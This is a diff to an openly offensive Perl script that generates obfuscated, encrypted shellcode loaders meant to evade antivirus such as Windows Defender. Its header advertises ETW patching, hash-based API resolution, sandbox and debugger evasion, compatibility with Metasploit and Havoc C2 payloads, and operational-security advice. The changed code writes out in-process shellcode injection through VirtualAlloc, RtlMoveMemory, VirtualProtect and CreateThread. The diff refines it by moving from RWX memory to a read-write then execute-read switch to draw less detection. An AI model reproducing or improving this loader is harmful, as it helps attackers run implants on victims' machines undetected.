@@ -1,7 +1,7 @@
 # =================================================================================================================================================================
 # 'Invoke-Perl-ShellCodeLoader.pl' is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.
 # It generates an obfuscated and encrypted shellcode loader (Perl script) that implements several antivirus bypass and defense evasion techniques.
-# Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
+# Author: https://github.com/JFR-C / GNU General Public License v3.0
 # =================================================================================================================================================================
 # Features: 
 # > Shellcode injection into the memory of the current process (Perl)
@@ -9,6 +9,7 @@
 # > Script obfuscation (function and variable names are randomized + multiple encoding layer)
 # > ETW bypass in user-mode (patching 'NtTraceEvent')
 # > Dynamic API resolution (via GetProcAddress + hash-based API resolution)
+# > Memory protection change after copy (PAGE_READWRITE changed to PAGE_EXECUTE_READ)
 # > Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
 # > Compatible with shellcodes of multiple C2 frameworks (e.g., Metasploit, Havoc)
 # OPSEC advice: remove all existing comments in this script before generating your obfuscated shellcode loader.
@@ -32,7 +33,7 @@ my ($input_file, $output_file) = @ARGV;
 my $raw = read_file($input_file, binmode => ':raw');
 my $escaped = join('', map { sprintf("\\x%02x", ord($_)) } split('', $raw));
 
-# 🔀 Random name generator
+# Random name generator
 sub rand_name {
     my @chars = ('a'..'z', 'A'..'Z');
     return join('', map { $chars[rand @chars] } 1 + int(rand(3)) .. 8);
@@ -84,7 +85,7 @@ sub $wrap{resolver} {
 }
 RESOLVER
 
-# Inner shellcode runner (nested payload)
+# Inner shellcode runner (no re-import of RtlMoveMemory)
 my $inner = <<"INNER";
 use strict;
 use warnings;
@@ -126,18 +127,22 @@ my \$gle = $wrap{resolver}("kernel32.dll", $api_hashes{GetLastError});
 
 my \$shellcode = "$escaped";
 my \$size = length(\$shellcode);
-print "Shellcode size: \$size bytes\\n";
+print "Shellcode size: \$size bytes\n";
 
-my \$ptr = Win32::API->new('kernel32', 'VirtualAlloc', ['N','N','N','N'], 'N')->Call(0, \$size, 0x1000 | 0x2000, 0x40);
-if (!\$ptr) {
-    my \$error = Win32::API->new('kernel32', 'GetLastError', [], 'N')->Call();
-    die "VirtualAlloc failed: \$error\\n";
-}
+my \$VirtualAlloc = Win32::API->new('kernel32', 'VirtualAlloc', ['N','N','N','N'], 'N');
+my \$ptr = \$VirtualAlloc->Call(0, \$size, 0x1000 | 0x2000, 0x04);  # RW
+die "VirtualAlloc failed\n" unless \$ptr;
 
-RtlMoveMemory(\$ptr, \$shellcode, \$size);
+Win32::API->new('kernel32', 'RtlMoveMemory', ['N','P','N'], 'V')->Call(\$ptr, \$shellcode, \$size);
 
-my \$thread = Win32::API->new('kernel32', 'CreateThread', ['N','N','N','N','N','N'], 'N')->Call(0, 0, \$ptr, 0, 0, 0);
-die "Thread creation failed\\n" unless \$thread;
+my \$VirtualProtect = Win32::API->new('kernel32', 'VirtualProtect', ['N','N','N','P'], 'N');
+my \$oldProtect = pack('L', 0);
+my \$result = \$VirtualProtect->Call(\$ptr, \$size, 0x20, \$oldProtect);  # RX
+die "VirtualProtect failed\n" unless \$result;
+
+my \$CreateThread = Win32::API->new('kernel32', 'CreateThread', ['N','N','N','N','N','N'], 'N');
+my \$thread = \$CreateThread->Call(0, 0, \$ptr, 0, 0, 0);
+die "Thread creation failed\n" unless \$thread;
 
 Win32::API->new('kernel32', 'WaitForSingleObject', ['N','N'], 'N')->Call(\$thread, -1);
 INNER
